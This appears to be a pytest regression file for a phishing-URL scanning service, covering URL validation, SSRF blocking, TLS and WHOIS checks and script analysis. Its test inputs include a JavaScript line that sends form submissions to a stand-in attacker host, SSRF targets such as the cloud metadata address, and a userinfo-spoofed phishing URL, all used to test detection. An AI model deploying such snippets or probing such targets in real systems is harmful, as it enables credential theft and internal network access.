"""
tests/test_regressions.py
Regression tests for bugs found during the project audit.
All tests run offline: network-touching helpers are monkeypatched.
"""
import io
import ssl
from datetime import datetime, timedelta, timezone

import pytest
from httpx import AsyncClient, ASGITransport
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse
from starlette.routing import Route

from app.services import scan_orchestrator
from static_analysis.url_normalizer import normalize_url


FAKE_STATIC = {
    "url": "",
    "protocol_check": {"uses_https": False},
    "lexical_analysis": {"ip_based_url": True, "contains_at_symbol": True},
    "html_analysis": {"html_fetched": True},
    "tls_analysis": {"https_supported": True, "certificate_valid": True},
    "whois_analysis": {"whois_found": True},
    "brand_analysis": {},
}


@pytest.fixture
def offline_static(monkeypatch):
    calls = []

    def fake_static(url):
        calls.append(url)
        return dict(FAKE_STATIC, url=url)

    monkeypatch.setattr(scan_orchestrator, "run_static_analysis", fake_static)
    return calls


# ── URL validation ────────────────────────────────────────────────────────

class TestScanUrlValidation:
    async def test_public_ip_url_is_scored_not_rejected(self, offline_static):
        result = await scan_orchestrator.scan_url("http://8.8.8.8/login")
        assert offline_static, "static analysis never ran for an IP URL"
        assert "Invalid domain" not in result["executive_summary"]
        assert result["risk_score"] > 0

    async def test_userinfo_url_is_scored_not_rejected(self, offline_static, monkeypatch):
        monkeypatch.setattr(scan_orchestrator, "is_private_ip", lambda url: False)
        result = await scan_orchestrator.scan_url("https://paypal.com@evil.example.com/")
        assert offline_static, "static analysis never ran for an @-userinfo URL"
        assert "Invalid domain" not in result["executive_summary"]

    async def test_url_with_port_is_scored_not_rejected(self, offline_static, monkeypatch):
        monkeypatch.setattr(scan_orchestrator, "is_private_ip", lambda url: False)
        await scan_orchestrator.scan_url("https://example.com:8443/")
        assert offline_static

    async def test_garbage_domain_still_rejected(self, offline_static):
        result = await scan_orchestrator.scan_url("https://not_a_domain/")
        assert not offline_static
        assert "Invalid domain" in result["executive_summary"]

    @pytest.mark.parametrize("url", [
        "http://127.0.0.1/",
        "http://10.0.0.5/",
        "http://169.254.169.254/latest/meta-data/",
        "http://0.0.0.0:8000/",
        "http://[::1]/",
    ])
    async def test_non_public_ip_is_blocked(self, offline_static, url):
        result = await scan_orchestrator.scan_url(url)
        assert not offline_static, f"static analysis ran against {url}"
        assert "cannot be scanned" in result["executive_summary"]


class TestLexical:
    def test_ip_url_is_not_multiple_subdomains(self):
        from static_analysis.lexical_analyzer import lexical_analysis

        result = lexical_analysis("http://8.8.8.8/login")
        assert result["ip_based_url"] is True
        assert result["multiple_subdomains"] is False

    def test_deep_subdomains_still_flagged(self):
        from static_analysis.lexical_analyzer import lexical_analysis

        assert lexical_analysis("https://login.secure.verify.example.com")["multiple_subdomains"] is True


class TestNormalizeUrl:
    def test_lowercases_scheme_and_host_only(self):
        assert normalize_url("HTTPS://Example.COM/Path/AbC?Q=1") == "https://example.com/Path/AbC?Q=1"

    def test_adds_scheme(self):
        assert normalize_url("Example.com/X") == "https://example.com/X"


# ── SSRF guards on the other entry points ──────────────────────────────────

class TestSsrfGuards:
    async def test_dynamic_scan_refuses_private_target(self, monkeypatch):
        called = []

        async def fake_dynamic(url, static_results=None):
            called.append(url)
            return {}

        monkeypatch.setattr(scan_orchestrator, "run_dynamic_analysis", fake_dynamic)
        result = await scan_orchestrator.run_dynamic_scan("http://127.0.0.1:8000/")
        assert not called, "sandbox browser was pointed at a loopback address"
        assert "error" in result

    async def test_scan_image_skips_private_urls(self, monkeypatch):
        from app.api import routes
        from app.main import app

        scanned = []
        monkeypatch.setattr(
            routes, "extract_text_from_image",
            lambda path: "see http://127.0.0.1/admin and https://example.com/a",
        )
        monkeypatch.setattr(
            routes, "is_private_ip", lambda url: "127.0.0.1" in url,
        )

        def fake_static(url):
            scanned.append(url)
            return dict(FAKE_STATIC, url=url)

        monkeypatch.setattr(routes, "run_static_analysis", fake_static)

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/scan-image", files={"file": ("x.png", io.BytesIO(b"fake"), "image/png")}
            )

        assert response.status_code == 200
        assert scanned == ["https://example.com/a"]
        urls = {item["url"]: item for item in response.json()["detected_urls"]}
        assert urls["http://127.0.0.1/admin"]["preview_severity"] == "Blocked"


# ── TLS checker ────────────────────────────────────────────────────────────

class _DummySock:
    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _tls_failing_with(monkeypatch, verify_code):
    from static_analysis import tls_checker

    err = ssl.SSLCertVerificationError("certificate verify failed")
    err.verify_code = verify_code

    class FailingContext:
        def wrap_socket(self, sock, server_hostname=None):
            raise err

    monkeypatch.setattr(tls_checker.socket, "create_connection", lambda *a, **k: _DummySock())
    monkeypatch.setattr(tls_checker.ssl, "create_default_context", lambda: FailingContext())
    return tls_checker.check_tls_certificate("example.com")


class TestTlsChecker:
    def test_self_signed_is_flagged(self, monkeypatch):
        result = _tls_failing_with(monkeypatch, 18)  # X509_V_ERR_DEPTH_ZERO_SELF_SIGNED_CERT
        assert result["self_signed_cert"] is True
        assert result["certificate_valid"] is False

    def test_hostname_mismatch_is_flagged(self, monkeypatch):
        result = _tls_failing_with(monkeypatch, 62)  # X509_V_ERR_HOSTNAME_MISMATCH
        assert result["domain_mismatch"] is True
        assert result["certificate_valid"] is False


# ── WHOIS ──────────────────────────────────────────────────────────────────

class TestWhois:
    def test_timezone_aware_creation_date(self, monkeypatch):
        from static_analysis import whois_checker

        class Record:
            registrar = "Example Registrar"
            creation_date = datetime.now(timezone.utc) - timedelta(days=5)

        monkeypatch.setattr(whois_checker.whois, "whois", lambda domain: Record())
        result = whois_checker.whois_check("example.com")
        assert result["domain_age_days"] == 5
        assert result["new_domain"] is True


# ── Explanation mapping ────────────────────────────────────────────────────

class TestExplanation:
    def test_tls_mismatch_gets_mismatch_paragraph(self):
        from scoring_engine.explanation import generate_explanation

        out = generate_explanation({}, {"reasons": ["TLS certificate domain mismatch"], "severity": "Medium"})
        assert "does not match" in out["detailed_analysis"][0]["report_paragraph"]


# ── Dynamic JS aggregation ─────────────────────────────────────────────────

class TestJsAggregation:
    def test_clean_page_without_password_field_is_not_flagged(self):
        from app.dynamic_analysis.sandbox_runner import aggregate_js_findings

        result = aggregate_js_findings([], {"credential_fields_detected": False}, False)
        assert result["medium_risk"] == []
        assert result["summary"] == "No suspicious script patterns detected."

    def test_credential_js_without_password_field_is_medium(self):
        from app.dynamic_analysis.sandbox_runner import aggregate_js_findings

        js = 'document.addEventListener("submit", e => fetch("https://evil.example/c"))'
        result = aggregate_js_findings([js], {"credential_fields_detected": False}, True)
        assert result["credential_related"] == []
        assert "credential_like_script_behavior" in result["medium_risk"]


# ── Rate limiter ───────────────────────────────────────────────────────────

class TestRateLimiter:
    async def test_only_post_requests_count_toward_limit(self):
        from app.core.middleware import RateLimitMiddleware

        async def ok(request):
            return PlainTextResponse("ok")

        inner = Starlette(routes=[Route("/", ok, methods=["GET", "POST"])])
        limited = RateLimitMiddleware(inner, requests_per_minute=2)

        async with AsyncClient(transport=ASGITransport(app=limited), base_url="http://test") as client:
            for _ in range(5):
                assert (await client.get("/")).status_code == 200
            assert (await client.post("/")).status_code == 200
            assert (await client.post("/")).status_code == 200
            assert (await client.post("/")).status_code == 429
